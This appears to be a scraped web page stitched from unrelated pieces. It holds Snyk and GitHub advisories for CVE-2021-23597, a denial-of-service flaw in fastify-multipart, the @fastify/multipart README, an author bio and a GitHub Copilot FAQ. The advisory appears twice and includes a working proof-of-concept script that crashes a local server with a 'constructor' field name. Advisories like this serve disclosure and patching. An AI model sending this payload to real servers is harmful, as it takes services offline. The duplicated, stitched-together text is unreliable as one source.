The user inputs the @ symbol to reveal a list of five Copilot Extensions. @Sentry is selected from the list, which shifts the window to a chat directly with that extension. There are three sample prompts at the bottom of the chat window, allowing the user to Get incident information, Edit status on incident, or List the latest issues. The last one is activated to send the prompt: @Sentry List the latest issues. The extension then lists several new issues and their metadata.

[CVE-2021-23597  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2021-23597) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-400  (opens in a new tab)](https://cwe.mitre.org/data/definitions/400.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `fastify-multipart` to version 5.3.1 or higher.

## Overview

[fastify-multipart](https://www.npmjs.com/package/fastify-multipart) is a Multipart plugin for Fastify

Affected versions of this package are vulnerable to Denial of Service (DoS). By providing a `name=constructor` property it is still possible to crash the application.

**Note:** This is a bypass of CVE-2020-8136 (<https://security.snyk.io/vuln/SNYK-JS-FASTIFYMULTIPART-1290382>).

## PoC

```
// npm i fastify
const http = require('http')
const fastify = require('fastify')()
const options = {
    addToBody: true,
    onFile: (fieldName, stream, filename, encoding, mimetype, body) => {
        stream.resume();
    }
};
fastify.register(require('fastify-multipart'), options);
fastify.post('/', function (req, reply) {
    console.log(req.body.toString());
    reply.code(200).send();
});
fastify.listen(3000, () => {
    console.log(`server listening on ${fastify.server.address().port}`)
    const body =
        '--AaB03x\r\n' +
        'content-disposition: form-data; name="constructor"; filename="file1.txt"\r\n' +
        'Content-Type: text/plain\r\n' +
        '\r\n' +
        '... contents of file1.txt ...\r\r\n' +
        '--AaB03x--\r\n';
    const r = {
        hostname: 'localhost',
        port: 3000,
        path: '/',
        method: 'POST',
        headers: {
            'content-type': 'multipart/form-data; boundary=AaB03x'
        }
    };
    const req = http.request(r, (res) => { });
    req.write(body);
    req.end();
});

```
## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).
* Crash - An attacker sending crafted requests that could cause the system to crash. For Example, [npm `ws` package](https://snyk.io/vuln/npm%3Aws%3A20171108)

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**

### Well Bonjour!

🏥
I work for a [clinical software developer](https://mbihealth.com/) working with the NHS.

Previously worked within the NHS over six years across Taunton and Somerset NHSFT, Yeovil District Hospital NHSFT, and Somerset NHSFT, as an information analyst and then an interface developer.

Have a knack for automating myself out of employment.

Fastify plugin to parse the multipart content-type. Supports:

* Async / Await
* Async iterator support to handle multiple parts
* Stream & Disk mode
* Accumulating the entire file in memory
* Mode to attach all fields to the request body
* Tested across Linux/Mac/Windows

Under the hood, it uses [`@fastify/busboy`](https://github.com/fastify/busboy).

## Install

```
npm i @fastify/multipart
```

## Usage

```
const fastify = require('fastify')()
const fs = require('node:fs')
const { pipeline } = require('node:stream/promises')

fastify.register(require('@fastify/multipart'))

fastify.post('/', async function (req, reply) {
  // process a single file
  // also, consider that if you allow to upload multiple files
  // you must consume all files otherwise the promise will never fulfill
  const data = await req.file()

  data.file // stream
  data.fields // other parsed parts
  data.fieldname
  data.filename
  data.encoding
  data.mimetype

  // to accumulate the file in memory! Be careful!
  //
  // await data.toBuffer() // Buffer
  //
  // or

  await pipeline(data.file, fs.createWriteStream(data.filename))

  // be careful of permission issues on disk and not overwrite
  // sensitive files that could cause security risks

  // also, consider that if the file stream is not consumed, the promise will never fulfill

  reply.send()
})

fastify.listen({ port: 3000 }, err => {
  if (err) throw err
  console.log(`server listening on ${fastify.server.address().port}`)
})
```

**Note** about `data.fields`: `busboy` consumes the multipart in serial order (stream). Therefore, the order of form fields is *VERY IMPORTANT* to how `@fastify/multipart` can display the fields to you.
We would recommend you place the value fields first before any of the file fields.
It will ensure your fields are accessible before it starts consuming any files.
If you cannot control the order of the placed fields, be sure to read `data.fields` *AFTER* consuming the stream, or it will only contain the fields parsed at that moment.

You can also pass optional arguments to `@fastify/busboy` when registering with Fastify. This is useful for setting limits on the content that can be uploaded. A full list of available options can be found in the [`@fastify/busboy` documentation](https://github.com/fastify/busboy#busboy-methods).

```
fastify.register(require('@fastify/multipart'), {
  limits: {
    fieldNameSize: 100, // Max field name size in bytes
    fieldSize: 100,     // Max field value size in bytes
    fields: 10,         // Max number of non-file fields
    fileSize: 1000000,  // For multipart forms, the max file size in bytes
    files: 1,           // Max number of file fields
    headerPairs: 2000,  // Max number of header key=>value pairs
    parts: 1000         // For multipart forms, the max number of parts (fields + files)
  }
});
```

For security reasons, `@fastify/multipart` sets the limit for `parts` and `fileSize` being *1000* and *1048576* respectively.

**Note**: if the file stream that is provided by `data.file` is not consumed, like in the example below with the usage of pipeline, the promise will not be fulfilled at the end of the multipart processing.
This behavior is inherited from [`@fastify/busboy`](https://github.com/fastify/busboy).

**Note**: if you set a `fileSize` limit and you want to know if the file limit was reached you can:

* listen to `data.file.on('limit')`
* or check at the end of the stream the property `data.file.truncated`
* or call `data.file.toBuffer()` and wait for the error to be thrown

```
const data = await req.file()
await pipeline(data.file, fs.createWriteStream(data.filename))
if (data.file.truncated) {
  // you may need to delete the part of the file that has been saved on disk
  // before the `limits.fileSize` has been reached
  reply.send(new fastify.multipartErrors.FilesLimitError());
}

// OR
const data = await req.file()
try {
  const buffer = await data.toBuffer()
} catch (err) {
  // fileSize limit reached!
}
```

Additionally, you can pass per-request options to the `req.file`, `req.files`, `req.saveRequestFiles` or `req.parts` function.

```
fastify.post('/', async function (req, reply) {
  const options = { limits: { fileSize: 1000 } };
  const data = await req.file(options)
  await pipeline(data.file, fs.createWriteStream(data.filename))
  reply.send()
})
```

## Handle multiple file streams

```
fastify.post('/', async function (req, reply) {
  const parts = req.files()
  for await (const part of parts) {
    await pipeline(part.file, fs.createWriteStream(part.filename))
  }
  reply.send()
})
```

## Handle multiple file streams and fields

```
fastify.post('/upload/raw/any', async function (req, reply) {
  const parts = req.parts()
  for await (const part of parts) {
    if (part.type === 'file') {
      await pipeline(part.file, fs.createWriteStream(part.filename))
    } else {
      // part.type === 'field
      console.log(part)
    }
  }
  reply.send()
})
```

## Accumulating the entire file in memory

```
fastify.post('/upload/raw/any', async function (req, reply) {
  const data = await req.file()
  const buffer = await data.toBuffer()
  // upload to S3
  reply.send()
})
```

## Upload files to disk and work with temporary file paths

This will store all files in the operating system's default directory for temporary files. As soon as the response ends all files are removed.

```
fastify.post('/upload/files', async function (req, reply) {
  // stores files to tmp dir and return files
  const files = await req.saveRequestFiles()
  files[0].type // "file"
  files[0].filepath
  files[0].fieldname
  files[0].filename
  files[0].encoding
  files[0].mimetype
  files[0].fields // other parsed parts

  reply.send()
})
```

## Handle file size limitation

If you set a `fileSize` limit, it can throw a `RequestFileTooLargeError` error when limit reached.

```
fastify.post('/upload/files', async function (req, reply) {
  try {
    const file = await req.file({ limits: { fileSize: 17000 } })
    //const files = req.files({ limits: { fileSize: 17000 } })
    //const parts = req.parts({ limits: { fileSize: 17000 } })
    //const files = await req.saveRequestFiles({ limits: { fileSize: 17000 } })
    reply.send()
  } catch (error) {
    // error instanceof fastify.multipartErrors.RequestFileTooLargeError
  }
})
```

If you want to fallback to the handling before `4.0.0`, you can disable the throwing behavior by passing `throwFileSizeLimit`.
Note: It will not affect the behavior of `saveRequestFiles()`

```
// globally disable
fastify.register(fastifyMultipart, { throwFileSizeLimit: false })

fastify.post('/upload/file', async function (req, reply) {
  const file = await req.file({ throwFileSizeLimit: false, limits: { fileSize: 17000 } })
  //const files = req.files({ throwFileSizeLimit: false, limits: { fileSize: 17000 } })
  //const parts = req.parts({ throwFileSizeLimit: false, limits: { fileSize: 17000 } })
  //const files = await req.saveRequestFiles({ throwFileSizeLimit: false, limits: { fileSize: 17000 } })
  reply.send()
})
```

## Parse all fields and assign them to the body

This allows you to parse all fields automatically and assign them to the `request.body`. By default, files are accumulated in memory (Be careful!) to buffer objects. Uncaught errors are [handled](https://github.com/fastify/fastify/blob/main/docs/Reference/Hooks.md#manage-errors-from-a-hook) by Fastify.

```
fastify.register(require('@fastify/multipart'), { attachFieldsToBody: true })

fastify.post('/upload/files', async function (req, reply) {
  const uploadValue = await req.body.upload.toBuffer() // access files
  const fooValue = req.body.foo.value                  // other fields
  const body = Object.fromEntries(
    Object.keys(req.body).map((key) => [key, req.body[key].value])
  ) // Request body in key-value pairs, like req.body in Express (Node 12+)

  // On Node 18+
  const formData = await req.formData()
  console.log(formData)
})
```

Request body key-value pairs can be assigned directly using `attachFieldsToBody: 'keyValues'`. Field values, including file buffers, will be attached to the body object.

```
fastify.register(require('@fastify/multipart'), { attachFieldsToBody: 'keyValues' })

fastify.post('/upload/files', async function (req, reply) {
  const uploadValue = req.body.upload // access file as buffer
  const fooValue = req.body.foo       // other fields
})
```

You can also define an `onFile` handler to avoid accumulating all files in memory.

```
async function onFile(part) {
  // you have access to original request via `this`
  console.log(this.id)
  await pipeline(part.file, fs.createWriteStream(part.filename))
}

fastify.register(require('@fastify/multipart'), { attachFieldsToBody: true, onFile })

fastify.post('/upload/files', async function (req, reply) {
  const fooValue = req.body.foo.value // other fields
})
```

The `onFile` handler can also be used with `attachFieldsToBody: 'keyValues'` in order to specify how file buffer values are decoded.

```
async function onFile(part) {
  const buff = await part.toBuffer()
  const decoded = Buffer.from(buff.toString(), 'base64').toString()
  part.value = decoded // set `part.value` to specify the request body value
}

fastify.register(require('@fastify/multipart'), { attachFieldsToBody: 'keyValues', onFile })

fastify.post('/upload/files', async function (req, reply) {
  const uploadValue = req.body.upload // access file as base64 string
  const fooValue = req.body.foo       // other fields
})
```

**Note**: if you assign all fields to the body and don't define an `onFile` handler, you won't be able to read the files through streams, as they are already read and their contents are accumulated in memory.
You can only use the `toBuffer` method to read the content.
If you try to read from a stream and pipe to a new file, you will obtain an empty new file.

## JSON Schema body validation

When the `attachFieldsToBody` parameter is set to `'keyValues'`, JSON Schema validation on the body will behave similarly to `application/json` and [`application/x-www-form-urlencoded`](https://github.com/fastify/fastify-formbody) content types. Additionally, uploaded files will be attached to the body as `Buffer` objects.

```
fastify.register(require('@fastify/multipart'), { attachFieldsToBody: 'keyValues' })

fastify.post('/upload/files', {
  schema: {
    consumes: ['multipart/form-data'],
    body: {
      type: 'object',
      required: ['myFile'],
      properties: {
        // file that gets decoded to string
        myFile: {
          type: 'object',
        },
        hello: {
          type: 'string',
          enum: ['world']
        }
      }
    }
  }
}, function (req, reply) {
  console.log({ body: req.body })
  reply.send('done')
})
```

If you enable `attachFieldsToBody: true` and set `sharedSchemaId` a shared JSON Schema is added, which can be used to validate parsed multipart fields.

```
const opts = {
  attachFieldsToBody: true,
  sharedSchemaId: '#mySharedSchema'
}
fastify.register(require('@fastify/multipart'), opts)

fastify.post('/upload/files', {
  schema: {
    consumes: ['multipart/form-data'],
    body: {
      type: 'object',
      required: ['myField'],
      properties: {
        // field that uses the shared schema
        myField: { $ref: '#mySharedSchema'},
        // or another field that uses the shared schema
        myFiles: { type: 'array', items: fastify.getSchema('mySharedSchema') },
        // or a field that doesn't use the shared schema
        hello: {
          properties: {
            value: {
              type: 'string',
              enum: ['male']
            }
          }
        }
      }
    }
  }
}, function (req, reply) {
  console.log({ body: req.body })
  reply.send('done')
})
```

If provided, the `sharedSchemaId` parameter must be a string ID and a shared schema will be added to your fastify instance so you will be able to apply the validation to your service (like in the example mentioned above).

The shared schema, that is added, will look like this:

```
{
  type: 'object',
  properties: {
    encoding: { type: 'string' },
    filename: { type: 'string' },
    limit: { type: 'boolean' },
    mimetype: { type: 'string' }
  }
}
```

### JSON Schema with Swagger

If you want to use `@fastify/multipart` with `@fastify/swagger` and `@fastify/swagger-ui` you must add a new type called `isFile` and use a custom instance of a validator compiler [Docs](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/#validator-compiler).

```
const fastify = require('fastify')({
 // ...
  ajv: {
    // Adds the file plugin to help @fastify/swagger schema generation
    plugins: [require('@fastify/multipart').ajvFilePlugin]
  }
})

fastify.register(require("@fastify/multipart"), {
  attachFieldsToBody: true,
});

fastify.post(
  "/upload/files",
  {
    schema: {
      consumes: ["multipart/form-data"],
      body: {
        type: "object",
        required: ["myField"],
        properties: {
          myField: { isFile: true },
        },
      },
    },
  },
  function (req, reply) {
    console.log({ body: req.body });
    reply.send("done");
  }
);
```

### JSON Schema non-file field

When sending fields with the body (`attachFieldsToBody` set to true), the field might look like this in the `request.body`:

```
{
  "hello": "world"
}
```

The mentioned field will be converted, by this plugin, to a more complex field. The converted field will look something like this:

```
{
  hello: {
    fieldname: "hello",
    value: "world",
    fieldnameTruncated: false,
    valueTruncated: false,
    fields: body
  }
}
```

It is important to know that this conversion happens BEFORE the field is validated, so keep that in mind when writing the JSON schema for validation for fields that don't use the shared schema. The schema for validation for the field mentioned above should look like this:

```
hello: {
  properties: {
    value: {
      type: 'string'
    }
  }
}
```

#### JSON non-file fields

If a non-file field sent has `Content-Type` header starting with `application/json`, it will be parsed using `JSON.parse`.

The schema to validate JSON fields should look like this:

```
hello: {
  properties: {
    value: {
      type: 'object',
      properties: {
        /* ... */
      }
    }
  }
}
```

If you also use the shared JSON schema as shown above, this is a full example that validates the entire field:

```
const opts = {
  attachFieldsToBody: true,
  sharedSchemaId: '#mySharedSchema'
}
fastify.register(require('@fastify/multipart'), opts)

fastify.post('/upload/files', {
  schema: {
    consumes: ['multipart/form-data'],
    body: {
      type: 'object',
      required: ['field'],
      properties: {
        field: {
          allOf: [
            { $ref: '#mySharedSchema' },
            {
              properties: {
                value: {
                  type: 'object'
                  properties: {
                    child: {
                      type: 'string'
                    }
                  }
                }
              }
            }
          ]
        }
      }
    }
  }
}, function (req, reply) {
  console.log({ body: req.body })
  reply.send('done')
})
```

## Access all errors

We export all custom errors via a server decorator `fastify.multipartErrors`. This is useful if you want to react to specific errors. They are derived from [@fastify/error](https://github.com/fastify/fastify-error) and include the correct `statusCode` property.

```
fastify.post('/upload/files', async function (req, reply) {
  const { FilesLimitError } = fastify.multipartErrors
})
```

GHSA-qh73-qc3p-rjv2
Feb 11, 2022

## Package

npm

fastify-multipart
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<= v5.3.0

## Patched versions

>= v5.3.1

## Description

### Impact

This is a bypass of [CVE-2020-8136](https://github.com/advisories/GHSA-p9f8-gqjf-m75j "CVE-2020-8136") (<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8136>).

By providing a `name=constructor` property it is still possible to crash the application.

The original fix only checks for the key `__proto__` ([#116](https://github.com/fastify/fastify-multipart/pull/116)).

All users are recommended to upgrade

### Patches

v5.3.1 includes a patch

### Workarounds

No workarounds are possible.

### References

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

## Package

npm

fastify-multipart
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

< 5.3.1

## Patched versions

5.3.1

## Description

### Impact

This is a bypass of [CVE-2020-8136](https://github.com/advisories/GHSA-p9f8-gqjf-m75j "CVE-2020-8136") (<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8136>).

By providing a `name=constructor` property it is still possible to crash the application.

The original fix only checks for the key `__proto__` ([fastify/fastify-multipart#116](https://github.com/fastify/fastify-multipart/pull/116)).

All users are recommended to upgrade

### Patches

v5.3.1 includes a patch

### Workarounds

No workarounds are possible.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

#### Introduced: 7 Feb 2022

[CVE-2021-23597  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2021-23597) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-400  (opens in a new tab)](https://cwe.mitre.org/data/definitions/400.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `fastify-multipart` to version 5.3.1 or higher.

## Overview

[fastify-multipart](https://www.npmjs.com/package/fastify-multipart) is a Multipart plugin for Fastify

Affected versions of this package are vulnerable to Denial of Service (DoS). By providing a `name=constructor` property it is still possible to crash the application.

**Note:** This is a bypass of CVE-2020-8136 (<https://security.snyk.io/vuln/SNYK-JS-FASTIFYMULTIPART-1290382>).

## PoC

```
// npm i fastify
const http = require('http')
const fastify = require('fastify')()
const options = {
    addToBody: true,
    onFile: (fieldName, stream, filename, encoding, mimetype, body) => {
        stream.resume();
    }
};
fastify.register(require('fastify-multipart'), options);
fastify.post('/', function (req, reply) {
    console.log(req.body.toString());
    reply.code(200).send();
});
fastify.listen(3000, () => {
    console.log(`server listening on ${fastify.server.address().port}`)
    const body =
        '--AaB03x\r\n' +
        'content-disposition: form-data; name="constructor"; filename="file1.txt"\r\n' +
        'Content-Type: text/plain\r\n' +
        '\r\n' +
        '... contents of file1.txt ...\r\r\n' +
        '--AaB03x--\r\n';
    const r = {
        hostname: 'localhost',
        port: 3000,
        path: '/',
        method: 'POST',
        headers: {
            'content-type': 'multipart/form-data; boundary=AaB03x'
        }
    };
    const req = http.request(r, (res) => { });
    req.write(body);
    req.end();
});

```
## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).
* Crash - An attacker sending crafted requests that could cause the system to crash. For Example, [npm `ws` package](https://snyk.io/vuln/npm%3Aws%3A20171108)

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

